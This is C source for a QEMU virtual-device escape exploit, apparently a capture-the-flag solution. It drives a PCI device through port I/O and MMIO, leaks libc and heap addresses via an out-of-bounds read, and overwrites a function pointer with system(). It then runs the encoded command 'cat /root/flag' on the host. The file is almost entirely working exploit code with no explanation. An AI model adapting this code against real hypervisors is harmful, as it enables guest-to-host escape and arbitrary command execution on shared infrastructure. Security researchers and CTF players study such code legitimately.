#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/io.h>

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)

#define PIO_BASE 0x000000000000c040

int fd, mmio_fd;
void *mmio_mem;

uint32_t page_offset(uint32_t addr) {
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr) {
    uint64_t pme, gfn;
    size_t offset;

    offset = ((uintptr_t)addr >> 9) & ~7;
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;

    return gfn;
}

uint64_t gva_to_gpa(void *addr) {
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

int init_mmio() {

    mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd < 0) {
        perror("open pci");
        return -1;
    }

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem < 0) {
        perror("mmap mmio_mem");
        return -1;
    }
    printf("mmio_mem: 0x%lx\n", (size_t) mmio_mem);

    return 0;
}

/* PIO */
void set_seek(uint32_t val) {
    outl(val, PIO_BASE + 0x8);
}

void set_seed(uint32_t val) {
    outl(val, PIO_BASE + 0x1c);
}

void empty_keys() {
    outl(0xff, PIO_BASE + 0x4);
}

void set_mode(uint32_t val) {
    outl(val, PIO_BASE + 0x0);
}

uint32_t get_mode() {
    return inl(PIO_BASE + 0x0);
}

uint32_t get_seek() {
    return inl(PIO_BASE + 0x8);
}

uint32_t get_key0() {
    return inl(PIO_BASE + 0xc);
}

uint32_t get_key1() {
    return inl(PIO_BASE + 0x10);
}

uint32_t get_key2() {
    return inl(PIO_BASE + 0x14);
}

uint32_t get_key3() {
    return inl(PIO_BASE + 0x18);
}

/* tea encryption */
void encrypt(uint32_t *v, uint32_t *k) {
    uint32_t v0 = v[0], v1 = v[1], sum = 0, i;           /* set up */
    uint32_t delta = 0x9e3779b9;                     /* a key schedule constant */
    uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];   /* cache key */
    for (i=0; i < 32; i++) {                       /* basic cycle start */
        sum += delta;
        v0 += ((v1 << 4) + k0) ^ (v1 + sum) ^ ((v1 >> 5) + k1);
        v1 += ((v0 << 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3);
    }                                              /* end cycle */
    v[0] = v0;
    v[1] = v1;
}

/* tea decryption */
void decrypt(uint32_t *v, uint32_t *k) {
    uint32_t v0 = v[0], v1 = v[1], sum = 0xC6EF3720, i;  /* set up */
    uint32_t delta = 0x9e3779b9;                     /* a key schedule constant */
    uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];   /* cache key */
    for (i=0; i<32; i++) {                         /* basic cycle start */
        v1 -= ((v0 << 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3);
        v0 -= ((v1 << 4) + k0) ^ (v1 + sum) ^ ((v1 >> 5) + k1);
        sum -= delta;
    }                                              /* end cycle */
    v[0] = v0;
    v[1] = v1;
}

int main() {
    int r = 0;
    void *userbuf;
    uint64_t phy_userbuf;

    fd = open("/proc/self/pagemap", O_RDONLY);
    if (!fd) {
        perror("open pagemap");
        return -1;
    }

    /* init PIO */
    r = iopl(3);
    if (r < 0) {
        perror("iopl");
        return -1;
    }

    /* init MMIO */
    r = init_mmio();
    if (r == -1) {
        perror("init mmio");
        return -1;
    }

    /* allocate a user buffer */
    userbuf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (userbuf == MAP_FAILED) {
        perror("mmap userbuf");
        return -1;
    }
    mlock(userbuf, 0x1000);
    phy_userbuf = gva_to_gpa(userbuf);
    printf("userbuf: 0x%lx\n", (uint64_t) userbuf);
    printf("phy_userbuf: 0x%lx\n", phy_userbuf);

    /* get keys */
    uint32_t key[4];
    key[0] = get_key0();
    key[1] = get_key1();
    key[2] = get_key2();
    key[3] = get_key3();
    printf("key[0]: 0x%x\n", key[0]);
    printf("key[1]: 0x%x\n", key[1]);
    printf("key[2]: 0x%x\n", key[2]);
    printf("key[3]: 0x%x\n", key[3]);

    /* leak and decrypt address */
    uint32_t v[2];
    uint32_t *ptr;
    uint64_t decrypt_data;
    set_seek(0x100);
    decrypt_data = *(uint64_t *)((uint8_t *) mmio_mem + 0x18); /* leak rand_r address */
    printf("decrypt_data: 0x%lx\n", decrypt_data);
    ptr = (uint32_t *) &decrypt_data;
    v[0] = *(ptr + 0x0);
    v[1] = *(ptr + 0x1);
    encrypt(v, key);
    uint64_t rand_addr = *((uint64_t *) v);
    printf("rand_addr: 0x%lx\n", rand_addr);
    uint64_t libc_base = rand_addr - 0x47d30;
    printf("libc_base: 0x%lx\n", libc_base);
    uint64_t system_addr = libc_base + 0x52290;
    printf("system_addr: 0x%lx\n", system_addr);
    decrypt_data = *(uint64_t *)((uint8_t *) mmio_mem + 0x38); /* leak heap address */
    printf("decrypt_data: 0x%lx\n", decrypt_data);
    ptr = (uint32_t *) &decrypt_data;
    v[0] = *(ptr + 0x0);
    v[1] = *(ptr + 0x1);
    encrypt(v, key);
    uint64_t heap_base = *((uint64_t *) v) - 0x120d610;
    printf("heap_base: 0x%lx\n", heap_base);
    uint64_t cmd_addr = heap_base + 0x120bf84;
    printf("cmd_addr: 0x%lx\n", cmd_addr);

    /* overwrite ptr */
    ptr = (uint32_t *) &system_addr;
    v[0] = *(ptr + 0x0);
    v[1] = *(ptr + 0x1);
    decrypt(v, key);
    decrypt_data = *((uint64_t *) v);
    printf("decrypt_data: 0x%lx\n", decrypt_data);
    *(uint64_t *)((uint8_t *) mmio_mem + 0x18) = decrypt_data;
    set_seek(0x0);
    uint32_t cmd[] = {0x20746163, 0x6f6f722f, 0x6c662f74, 0x6761, 0x0}; // char cmd[] = "cat /root/flag";
    for (int i = 0; i < 2; i++) {
        v[0] = cmd[2 * i + 1];
        v[1] = cmd[2 * i + 2];
        decrypt(v, key);
        decrypt_data = *((uint64_t *) v);
        printf("decrypt_data: 0x%lx\n", decrypt_data);
        *(uint64_t *)((uint8_t *) mmio_mem + (i << 3)) = decrypt_data;
    }

    /* trigger vul */
    set_seed(cmd[0]);

    close(fd);
    close(mmio_fd);

    return 0;
}
